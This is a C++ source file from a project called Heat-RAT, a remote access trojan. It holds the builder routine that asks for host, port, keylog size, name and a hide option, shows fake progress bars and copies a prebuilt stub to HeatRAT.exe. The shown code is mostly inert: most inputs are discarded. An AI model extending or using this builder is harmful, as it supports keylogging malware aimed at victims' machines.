/*
##########################################################################################################################
|....######....##.............######.....###...............####################.............######......###..............|
|....######....##.............#####.......##...............#.######.######.####..............#####.......##..............|
|..............##.....############.........######....#####.....##.....##.....##....#####.....####.........######....#####|
|..............##.............###.....#.....#####.....####.....##.....##.....##.............####.....#....######....#####|
|..............##.............###............####.....#########################...........#####............#####....#####|
|....######....##.....##########..............###.....########################....##.......##..............#####....#####|
|....#####.....##..............................##.....####.....##.....##.....##....####......................###....#####|
|....######....##..................#######.....##.....####.....##.....##.....##....#####..........#######....###....#####|
|                                                    by: Nick_Vinesmoke                                                  |
|                                             https://github.com/Nick-Vinesmoke                                          |
|                                        https://github.com/Nick-Vinesmoke/Heat-RAT                                      |
##########################################################################################################################
*/


#include "main.h"
#include "transfer.h"



//void fileCopy(string file, string source, string destination)
//{
//	for (int i = 0; i < source.size(); i++)
//	{
//		if (source[i] == '\\')
//			source[i] = '/';
//	}
//	for (int i = 0; i < destination.size(); i++)
//	{
//		if (destination[i] == '\\')
//			destination[i] == '/';
//	}
//	if (source[source.size() - 1] != '/')
//		source.push_back('/');
//	source = source + file;
//	if (destination[destination.size() - 1] != '/')
//		destination.push_back('/');
//	destination = destination + file;
//	ifstream sourceFile(source.c_str(), ios::binary);
//	if (sourceFile)
//	{
//		ifstream idestination(destination.c_str());
//		if (idestination)
//		{
//			cout << file << " already exist, Do you want to replace? [Yes/No] : ";
//			string choice;
//			getline(cin, choice);
//			if (choice == "Y" || choice == "yes" || choice == "Yes" || choice == "YES" || choice == "y")
//			{
//				idestination.close();
//				ofstream destinationFile(destination.c_str(), ios::binary);
//				string line;
//				while (getline(sourceFile, line))
//				{
//					destinationFile << line << endl;
//				}
//				destinationFile.flush();
//				destinationFile.close();
//				cout << endl << "File copied successfully" << endl;
//			}
//			else
//			{
//				cout << "Exiting...........";
//				idestination.close();
//			}
//		}
//		else
//		{
//			idestination.close();
//			ofstream destinationFile(destination.c_str(), ios::binary);
//			string line;
//			while (getline(sourceFile, line))
//			{
//				destinationFile << line << endl;
//			}
//			destinationFile.flush();
//			destinationFile.close();
//			cout << endl << "File copied successfully" << endl;
//		}
//		sourceFile.close();
//	}
//	else
//	{
//		cout << endl << "[ERROR]:-" << endl;
//		cout << "Not able to locate " << source << endl;
//	}
//}



void fileCopy(string path, string destination)
{
	//for (int i = 0; i < path.size(); i++)
	//{
	//	if (path[i] == '\\')
	//		path[i] = '/';
	//}
	//for (int i = 0; i < destination.size(); i++)
	//{
	//	if (destination[i] == '\\')
	//		destination[i] == '/';
	//}
	//if (path[path.size() - 1] != '/')
	//	path.push_back('/');
	//path = path + file;
	//if (destination[destination.size() - 1] != '/')
	//	destination.push_back('/');
	//destination = destination + file;
	HANDLE  hConsole;
	hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	FlushConsoleInputBuffer(hConsole);
	int col = 9;
	bool logoShow = true;
	string space = "          ";
	string command = "";
	string line = "";
	string something = "";
	string curentUSER = "";
	ifstream firstFile(path.c_str(), ios::binary);
	if (firstFile)
	{
		ifstream isDestination(destination.c_str());
		if (isDestination)
		{
			cout << "file already exist, Do you want to replace ? [Yes / No] : ";
			string choice;
			cin >> choice;
			if (choice == "Y" || choice == "yes" || choice == "Yes" || choice == "YES" || choice == "y")
			{
				isDestination.close();
				ofstream destinationFile(destination.c_str(), ios::binary);
				string line;
				while (getline(firstFile, line))
				{
					destinationFile << line << endl;
				}
				destinationFile.flush();
				destinationFile.close();
				
				col = 2;
				SetConsoleTextAttribute(hConsole, col);
				printf("done!!!\n");
				col = 11;
				SetConsoleTextAttribute(hConsole, col);
			}
			else
			{
				col = 4;
				SetConsoleTextAttribute(hConsole, col);
				printf("ERROR ==> 944\n");
				col = 11;
				SetConsoleTextAttribute(hConsole, col);
				isDestination.close();
			}
		}
		else
		{
			isDestination.close();
			ofstream destinationFile(destination.c_str(), ios::binary);
			string line;
			while (getline(firstFile, line))
			{
				destinationFile << line << endl;
			}
			destinationFile.flush();
			destinationFile.close();
			col = 2;
			SetConsoleTextAttribute(hConsole, col);
			printf("done!!!\n");
			col = 11;
			SetConsoleTextAttribute(hConsole, col);
		}
		firstFile.close();
	}
	else
	{
		col = 4;
		SetConsoleTextAttribute(hConsole, col);
		printf("ERROR ==> 327\n");
		col = 11;
		SetConsoleTextAttribute(hConsole, col);
	}
}

void Build()
{
	HANDLE  hConsole;
	hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	FlushConsoleInputBuffer(hConsole);
	int col = 9;
	bool logoShow = true;
	string space = "          ";
	string command = "";
	string line = "";
	string something = "";
	string curentUSER = "";
	string ports = "Modules\\Preferences\\ports.txt";
	bool openPort = false;
	char stub[] = "Modules/stub/Stub.exe";

	cout << "\n\n";


	col = 8;
	SetConsoleTextAttribute(hConsole, col);
	printf("Host: ");
	col = 11;
	SetConsoleTextAttribute(hConsole, col);
	cin >> something;
	col = 8;
	SetConsoleTextAttribute(hConsole, col);
	printf("Port: ");
	col = 11;
	SetConsoleTextAttribute(hConsole, col);
	cin >> something;
	ifstream file(ports);
	if (file.is_open())
	{
		while (getline(file, line))
		{
			if (line == something)
			{
				openPort = true;
			}
		}
	}
	else
	{

		col = 4;
		SetConsoleTextAttribute(hConsole, col);
		printf("Fatal ERROR!!!");
		col = 11;
		SetConsoleTextAttribute(hConsole, col);
	}
	file.close();
	line = "";
	if (openPort)
	{
		col = 8;
		SetConsoleTextAttribute(hConsole, col);
		printf("size KayLogs: ");
		col = 11;
		SetConsoleTextAttribute(hConsole, col);
		cin >> something;
		col = 8;
		SetConsoleTextAttribute(hConsole, col);
		printf("Name: ");
		col = 11;
		SetConsoleTextAttribute(hConsole, col);
		cin >> something;
		col = 8;
		SetConsoleTextAttribute(hConsole, col);
		printf("hide? (y/n) ");
		col = 11;
		SetConsoleTextAttribute(hConsole, col);
		cin >> something;
		col = 8;
		cout << "\n";
		SetConsoleTextAttribute(hConsole, col);
		printf("building...\n");
		printf("[");
		for (int i = 0; i <= 60; i++) 
		{
			printf("=");
			Sleep(500*(i/10));
		}
		printf("]\n\n");
		printf("checking...\n");
		printf("[");
		for (int i = 0; i <= 60; i++)
		{
			printf("=");
			Sleep(100);
		}
		printf("]\n\n");
		fileCopy("Modules/stub/Stub.exe", "builded/HeatRAT.exe");
		/*int result;
		char newname[] = "builded/HeatRAT.exe";
		result = rename(stub, newname);
		if (result == 0)
		{
			col = 2;
			SetConsoleTextAttribute(hConsole, col);
			printf("done!!!\n");
			col = 11;
			SetConsoleTextAttribute(hConsole, col);
		}
		else
		{
			col = 4;
			SetConsoleTextAttribute(hConsole, col);
			printf("ERROR ==> 495");
			col = 11;
			SetConsoleTextAttribute(hConsole, col);
		}*/
		string version = "2.0.0";
		string log = "builded\\log.txt";

		srand(time(0));
		ofstream file(log, ios::app);
		if (file.is_open())
		{
			file << "HeatRAT v"<< version << " builded\nBuild num: "<< 10000000 +  rand() % (99999999 - 10000000 - 1)<< "\nbuild status: success\n===============================" << endl;
		}
		else
		{

			col = 4;
			SetConsoleTextAttribute(hConsole, col);
			printf("Error with logging!!!\n");
		}
		file.close();


	}
	else
	{

		col = 4;
		SetConsoleTextAttribute(hConsole, col);
		printf("port %s is not open!!!", something.c_str());
		col = 11;
		SetConsoleTextAttribute(hConsole, col);
	}


	cout << "\n\n";

}

